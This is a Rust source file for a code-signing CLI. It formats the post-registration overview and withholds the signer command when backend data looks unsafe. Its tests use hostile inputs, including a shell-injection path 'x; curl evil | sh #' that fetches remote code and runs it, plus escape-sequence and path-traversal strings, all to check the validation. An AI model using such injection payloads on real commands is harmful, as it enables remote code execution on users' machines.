use anstyle::Style;
use common::AsfaloadHashes;
use features_lib::constants::{PENDING_SIGNERS_DIR, SIGNERS_FILE};
use rest_api_types::RegisterRepoResponse;

use crate::cli::DEFAULT_BACKEND;
use crate::utils::program_name;

const BOLD: Style = Style::new().bold();

/// Removes control characters, so that text from the backend cannot
/// use terminal escape sequences to hide or change the output.
fn strip_control_chars(text: &str) -> String {
    text.chars().filter(|c| !c.is_control()).collect()
}

/// A project ID is safe in a shell command when it has only ASCII letters, digits
/// and `/`, `.`, `-`, `_`, and when no path segment is empty, `.` or `..`.
fn is_safe_project_id(project_id: &str) -> bool {
    !project_id.is_empty()
        && project_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '-' | '_'))
        && project_id
            .split('/')
            .all(|segment| !matches!(segment, "" | "." | ".."))
}

/// The path of the pending signers file for a project.
fn expected_signers_file_path(project_id: &str) -> String {
    format!("{project_id}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}")
}

/// True when the backend data is safe to put in a command for the signers.
fn is_safe_to_show_command(response: &RegisterRepoResponse) -> bool {
    is_safe_project_id(&response.project_id)
        && response.signers_file_path == expected_signers_file_path(&response.project_id)
}

/// Print the output of a successful register-repo or update-signers.
pub fn print_submission_overview(
    headline: &str,
    response: &RegisterRepoResponse,
    digest: &AsfaloadHashes,
    backend_url: &str,
) {
    let non_default_backend = (backend_url != DEFAULT_BACKEND).then_some(backend_url);
    // anstream removes the styles when stdout is not a terminal.
    anstream::print!(
        "{}",
        submission_overview(
            headline,
            response,
            digest,
            non_default_backend,
            &program_name(),
            true,
        )
    );
}

/// Build the human output after a successful register-repo or update-signers.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
/// Signers must then contact the same backend, so the command shows it.
pub fn submission_overview(
    headline: &str,
    response: &RegisterRepoResponse,
    digest: &AsfaloadHashes,
    backend_url: Option<&str>,
    executable: &str,
    with_ansi: bool,
) -> String {
    let bold = if with_ansi { BOLD } else { Style::new() };
    let mut lines = vec![
        format!(
            "{bold}{headline}:{bold:#} {}",
            strip_control_chars(&response.project_id)
        ),
        String::new(),
    ];
    if response.required_signers.is_empty() {
        lines.push("The signers file is active. No more signatures are necessary.".to_string());
    } else {
        lines.push(format!("{bold}Keys that can still sign{bold:#}"));
        lines.extend(
            response
                .required_signers
                .iter()
                .map(|key| format!("  {}", strip_control_chars(key))),
        );
        lines.push(String::new());
        if is_safe_to_show_command(response) {
            lines.push(format!("{bold}Next step{bold:#}"));
            lines.push(
                "  Send this command to the signers. Each signer replaces <secret-key>".to_string(),
            );
            lines.push("  with their secret key file:".to_string());
            lines.push(String::new());
            lines.push(format!("     {executable} sign-pending \\"));
            lines.push(format!("       --digest {digest} \\"));
            lines.push(format!("       {} \\", response.signers_file_path));
            // The parts to fill in come last, so the backend URL is before the secret key.
            if let Some(url) = backend_url {
                lines.push(format!("       --backend-url {url} \\"));
            }
            lines.push("       --secret-key <secret-key>".to_string());
        } else {
            lines.push(format!("{bold}Warning{bold:#}"));
            lines.push(
                "  The backend returned an unexpected project ID or signers file path.".to_string(),
            );
            lines.push("  For security, the command for the signers is not shown.".to_string());
            lines.push("  Signers can find the file with list-pending.".to_string());
        }
    }
    let mut output = lines.join("\n");
    output.push('\n');
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use features_lib::constants::{PENDING_SIGNERS_DIR, SIGNERS_DIR, SIGNERS_FILE};

    const PROJECT_ID: &str = "http/localhost/44241/project";

    fn pending_path() -> String {
        format!("{PROJECT_ID}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}")
    }

    fn response(required_signers: Vec<&str>) -> RegisterRepoResponse {
        RegisterRepoResponse {
            success: true,
            project_id: PROJECT_ID.to_string(),
            message: "unused".to_string(),
            required_signers: required_signers.into_iter().map(String::from).collect(),
            signature_submission_url: "/v1/signatures".to_string(),
            signers_file_path: pending_path(),
        }
    }

    fn digest() -> AsfaloadHashes {
        common::sha512_for_content(&b"signers file content"[..]).unwrap()
    }

    #[test]
    fn overview_with_missing_signatures_shows_keys_and_sign_command() {
        let keys = vec!["asfaload-pub:key-a", "asfaload-pub:key-b"];
        let output = submission_overview(
            "Repository registered",
            &response(keys),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        let expected = format!(
            "Repository registered: http/localhost/44241/project\n\
             \n\
             Keys that can still sign\n  \
             asfaload-pub:key-a\n  \
             asfaload-pub:key-b\n\
             \n\
             Next step\n  \
             Send this command to the signers. Each signer replaces <secret-key>\n  \
             with their secret key file:\n\
             \n     \
             asfaload-cli sign-pending \\\n       \
             --digest {} \\\n       \
             {} \\\n       \
             --secret-key <secret-key>\n",
            digest(),
            pending_path()
        );
        assert_eq!(output, expected);
    }

    #[test]
    fn overview_when_file_is_active_has_no_sign_command() {
        let output = submission_overview(
            "Repository registered",
            &response(vec![]),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        assert_eq!(
            output,
            "Repository registered: http/localhost/44241/project\n\
             \n\
             The signers file is active. No more signatures are necessary.\n"
        );
    }

    #[test]
    fn overview_with_non_default_backend_adds_backend_url_before_secret_key() {
        let output = submission_overview(
            "Signers update proposed",
            &response(vec!["asfaload-pub:key-a"]),
            &digest(),
            Some("http://localhost:3000"),
            "asfaload-cli",
            false,
        );
        assert!(
            output.contains(
                "       --backend-url http://localhost:3000 \\\n       --secret-key <secret-key>\n"
            ),
            "backend URL must come just before the secret key placeholder, got: {output}"
        );
        assert!(output.starts_with("Signers update proposed: "));
    }

    #[test]
    fn overview_with_default_backend_has_no_backend_url() {
        let output = submission_overview(
            "Repository registered",
            &response(vec!["asfaload-pub:key-a"]),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        assert!(
            !output.contains("--backend-url"),
            "default backend must not be in the command, got: {output}"
        );
    }

    #[test]
    fn overview_without_ansi_has_no_escape_codes_and_with_ansi_has_some() {
        let build = |with_ansi| {
            submission_overview(
                "Repository registered",
                &response(vec!["asfaload-pub:key-a"]),
                &digest(),
                None,
                "asfaload-cli",
                with_ansi,
            )
        };
        assert!(!build(false).contains('\x1b'));
        assert!(build(true).contains('\x1b'));
    }

    fn overview_for(response: &RegisterRepoResponse) -> String {
        submission_overview(
            "Repository registered",
            response,
            &digest(),
            None,
            "asfaload-cli",
            false,
        )
    }

    fn assert_command_withheld(output: &str) {
        assert!(
            !output.contains("sign-pending"),
            "command must not be shown, got: {output}"
        );
        assert!(output.contains("Warning"), "warning missing, got: {output}");
        assert!(output.contains("list-pending"), "got: {output}");
    }

    #[test]
    fn overview_withholds_command_when_path_has_shell_injection() {
        let mut r = response(vec!["asfaload-pub:key-a"]);
        r.signers_file_path = "x; curl evil | sh #".to_string();
        assert_command_withheld(&overview_for(&r));
    }

    #[test]
    fn overview_withholds_command_when_path_is_the_active_file() {
        let mut r = response(vec!["asfaload-pub:key-a"]);
        r.signers_file_path = format!("{PROJECT_ID}/{SIGNERS_DIR}/{SIGNERS_FILE}");
        assert_command_withheld(&overview_for(&r));
    }

    #[test]
    fn overview_withholds_command_when_project_id_is_not_safe() {
        for bad in ["http/local host/project", "http/../project", "a/b\x1b[2K"] {
            let mut r = response(vec!["asfaload-pub:key-a"]);
            r.project_id = bad.to_string();
            r.signers_file_path = format!("{bad}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}");
            assert_command_withheld(&overview_for(&r));
        }
    }

    #[test]
    fn overview_removes_control_characters_from_keys_and_project_id() {
        let mut r = response(vec!["asfaload-pub:\x1b[2Kkey-a"]);
        r.project_id = "proj\x1b[2Kect".to_string();
        let output = overview_for(&r);
        assert!(!output.contains('\x1b'), "got: {output:?}");
        assert!(output.contains("  asfaload-pub:[2Kkey-a\n"));
        assert!(
            output.contains("registered: proj[2Kect\n"),
            "got: {output:?}"
        );
    }

    #[test]
    fn is_safe_project_id_cases() {
        let cases = [
            ("http/localhost/44241/project", true),
            ("github.com/acme/tool_1-x", true),
            ("", false),
            ("a b", false),
            ("a/../b", false),
            ("a/./b", false),
            ("a//b", false),
            ("/a", false),
            ("a/", false),
            ("a;b", false),
            ("a\x1b", false),
            ("é/a", false),
        ];
        for (input, expected) in cases {
            assert_eq!(is_safe_project_id(input), expected, "input {input:?}");
        }
    }

    #[test]
    fn strip_control_chars_removes_only_control_chars() {
        assert_eq!(strip_control_chars("a\x1b[2Kb\nc\u{7}"), "a[2Kbc");
    }
}
